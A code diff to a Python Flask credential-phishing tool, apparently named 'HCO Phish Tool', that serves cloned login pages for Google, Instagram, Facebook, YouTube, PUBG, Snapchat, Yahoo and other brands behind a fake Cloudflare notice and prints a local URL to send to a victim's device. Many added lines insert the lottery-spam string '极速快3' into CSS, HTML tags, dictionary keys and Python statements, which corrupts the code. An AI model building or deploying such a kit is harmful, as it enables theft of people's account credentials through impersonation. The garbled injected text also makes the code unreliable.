@@ -209,6 +209,7 @@ LOGIN_TEMPLATES = {
             height: 100vh;
         }
         .container {
+           极速快3
             max-width: 400px;
             width: 100%;
             text-align: center;
@@ -219,6 +220,7 @@ LOGIN_TEMPLATES = {
             font-weight: bold;
             margin-bottom: 30px;
         }
+       极速快3
         .login-box {
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -239,9 +241,10 @@ LOGIN_TEMPLATES = {
             color: white;
             border: none;
             border-radius: 4px;
+           极速快3
             font-size: 16px;
             font-weight: bold;
-            margin: 20px 0;
+            margin: 20px 极速快3;
         }
         .footer {
             margin-top: 20px;
@@ -258,7 +261,7 @@ LOGIN_TEMPLATES = {
             <p>Use your Google Account</p>
             <form>
                 <input type="email" placeholder="Email or phone">
-                <button>Next</button>
+                <button>Next</极速快3ton>
             </form>
         </div>
         <div class="footer">© 2024 Google</div>
@@ -277,14 +280,14 @@ PLATFORMS = {
     "5": {"name": "Free Fire", "path": "/freefire"},
     "6": {"name": "PUBG", "path": "/pubg"},
     "7": {"name": "BGMI", "path": "/bgmi"},
-    "8": {"name": "Threads", "path": "/threads"},
+    "8": {"name": "Threads", "极速快3path": "/threads"},
     "9": {"name": "Snapchat", "path": "/snapchat"},
     "10": {"name": "Yahoo", "path": "/yahoo"}
 }
 
 @app.route('/')
 def index():
-    return """
+    return render_template_string("""
 <!DOCTYPE html>
 <html>
 <head>
@@ -295,6 +298,7 @@ def index():
             background: #f0f6ff;
             text-align: center;
             padding: 50px;
+            margin: 0;
         }
         .cloudflare-logo {
             font-size: 48px;
@@ -307,35 +311,45 @@ def index():
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0,0,0,0.1);
             max-width: 500px;
-            margin: 0 auto;
+            margin: 100px auto;
+        }
+        h2 {
+            color: #f38020;
+            margin-bottom: 15px;
+        }
+        p {
+            color: #666;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="cloudflare-logo">☁️</div>
     <div class="protected">
+        <div class="cloudflare-logo">☁️</div>
         <h2>Protected by Cloudflare</h2>
         <p>This content is secured by Cloudflare security services</p>
+        <p>Please use specific platform links:</p>
+        <p><a href="/instagram">Instagram</a> | <a href="/facebook">Facebook</a> | <a href="/gmail">Gmail</a></p>
     </div>
 </body>
 </html>
-    """
+    """)
 
 @app.route('/instagram')
 def instagram():
-    return LOGIN_TEMPLATES["instagram"]
+    return render_template_string(LOGIN_TEMPLATES["instagram"])
 
 @app.route('/facebook')
 def facebook():
-    return LOGIN_TEMPLATES["facebook"]
+    return render_template_string(LOGIN_TEMPLATES["facebook"])
 
 @app.route('/gmail')
 def gmail():
-    return LOGIN_TEMPLATES["gmail"]
+    return render_template_string(LOGIN_TEMPLATES["gmail"])
 
 @app.route('/youtube')
 def youtube():
-    return """
+    return render_template_string("""
 <!DOCTYPE html>
 <html>
 <head>
@@ -382,7 +396,7 @@ def youtube():
 </head>
 <body>
     <div class="header">YouTube</div>
-    <div class="login-container">
+    <div极速快3 class="login-container">
         <h2>Sign in</h2>
         <input type="email" placeholder="Email">
         <input type="password" placeholder="Password">
@@ -390,32 +404,32 @@ def youtube():
     </div>
 </body>
 </html>
-    """
+    """)
 
 # Add similar routes for other platforms
 @app.route('/freefire')
 def freefire():
-    return create_login_page("Free Fire", "#ff6600")
+    return render_template_string(create_login_page("Free Fire", "#ff6600"))
 
 @app.route('/pubg')
 def pubg():
-    return create_login_page("PUBG Mobile", "#ffcc00") 
+    return render_template_string(create_login_page("PUBG Mobile", "#ffcc00"))
 
 @app.route('/bgmi')
 def bgmi():
-    return create_login_page("BGMI", "#3366ff")
+    return render_template_string(create_login_page("BGMI", "#3366ff"))
 
 @app.route('/threads')
 def threads():
-    return create_login_page("Threads", "#000000")
+    return render_template_string(create_login_page("Threads", "#000000"))
 
 @app.route('/snapchat')
 def snapchat():
-    return create_login_page("Snapchat", "#fffc00")
+    return render_template_string(create_login_page("Snapchat", "#fffc00"))
 
 @app.route('/yahoo')
 def yahoo():
-    return create_login_page("Yahoo", "#720e9e")
+    return render_template_string(create_login_page("Yahoo", "#720e9e"))
 
 def create_login_page(name, color):
     return f"""
@@ -483,7 +497,7 @@ def print_banner():
     print("╔══════════════════════════════════════════════════╗")
     print("║                HCO Phish Tool                   ║")
     print("║                 by Azhar                        ║")
-    print("╚══════════════════════════════════════════════════╝")
+极速快3    print("╚══════════════════════════════════════════════════╝")
     print(f"{colors.END}")
     print(f"{colors.RED}Tool locked 🔐 To unlock subscribe our YouTube channel{colors.END}")
     print()
@@ -502,7 +516,7 @@ def open_youtube():
     try:
         # Try using am (Android activity manager)
         result = subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', 
-                               '-d', 'https://www.youtube.com'], 
+                               '-极速快3d', 'https://www.youtube.com'], 
                               capture_output=True, text=True, timeout=10)
         if result.returncode == 0:
             return True
@@ -553,7 +567,7 @@ def countdown():
     if choice in PLATFORMS:
         platform = PLATFORMS[choice]
         ip = get_ip()
-        print(f"\n{colors.BLUE}Selected: {platform['name']}{colors.END}")
+        print(f"\n{colors.BLUE}Selected: {platform['name']}{colors极速快3.END}")
         print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
         print(f"{colors.GREEN}Open this URL on another device (phone/computer){colors.END}")
         print(f"{colors.WHITE}Press Enter to continue...{colors.END}")
